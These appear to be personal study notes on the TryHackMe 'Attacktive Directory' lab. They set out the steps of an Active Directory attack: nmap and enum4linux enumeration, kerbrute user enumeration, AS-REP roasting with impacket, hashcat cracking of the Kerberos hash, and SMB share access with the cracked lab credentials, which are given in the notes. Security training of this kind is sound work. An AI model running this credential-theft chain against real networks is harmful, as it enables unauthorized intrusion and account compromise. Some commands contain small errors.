# [Active Directory](https://tryhackme.com/room/attacktivedirectory)

## I. 
1. Enumeration : `nmap -A -p- -v @IP`
POrt 139/445 :
ON port we usualy have : SMB. So we can use enum4linux to attack this service.
A this point the DNS_Domain_Name was given inthe ouput of the nmap cmd :
    ```
    |   rdp-ntlm-info: 
    |   Target_Name: THM-AD
    |   NetBIOS_Domain_Name: THM-AD
    |   NetBIOS_Computer_Name: ATTACKTIVEDIREC
    |   DNS_Domain_Name: spookysec.local
    |   DNS_Computer_Name: AttacktiveDirectory.spookysec.local
    |   Product_Version: 10.0.17763
    |_  System_Time: 2023-06-13T17:57:17+00:00
    ```

SInce we are on a local network , we should add the DNS_DOmain_Name to our /etc/hosts file.
``` 
    sudo echo 10.10.91.31 spookysec.local >> /etc/host
```


2. `enum4linux -a @IP`

3. .local

## II.
To enumerate kerberos we can use [kerbrute](https://github.com/ropnop/kerbrute/releases), we can use kerbrus(version 1.0.2 in my case). ON my Computer it is stored in my user directory. /home

``./kerbrute_linux_386  `userenum` -d spookysec.local --dc 10.10.91.31 Téléchargements/userlist-AD.txt -t 100```

or 

(in the /etc/hosts we added this line : 10.10.91.31     spookysec.local)
`` ./kerbrute_linux_386  userenum -d spookysec.local --dc spookysec.local Téléchargements/ userlist-AD.txt -t 100 ```

# III. Abusing kerberos

We use impacket to get one of the user ticket. Try for the user which you don't need password.
`python3 /opt/impacket/examples/GetNPUsers.py spookysec.local/svc-admin -no-pass`.

From this, then we go to [hashcat](https://hashcat.net/wiki/doku.php?id=example_hashes), we try to find which mode was used and which type of kerberos hash



Example : 
hashcat -m 18200 THM_toDelete/hash  -a 0 Téléchargements/passwordlist-AD.txt 

THe results : it will append at the end of the input file the unhashed password

# IV. Enumerate SMB

1. We can use smbclient to map remote smb shares.

-L : List of remote shares
-U : Username
-P : Password

2. List of remote shares : 
`smbclient -L 10.10.91.31 -U 'svc-admin' -p 'management2005'`

To connect to the share we want: `smbclient -U 'svc-admin' //10.10.91.31/backup`
Then type the password

After logging we just make `get name_file`

After that we just have to decode the content of the file then it is all good. --> backup@spookysec.local:backup2517860

We need to find the secredump.py file : on se met à la raçine
`find . -type f -name 'secretdump.py'`
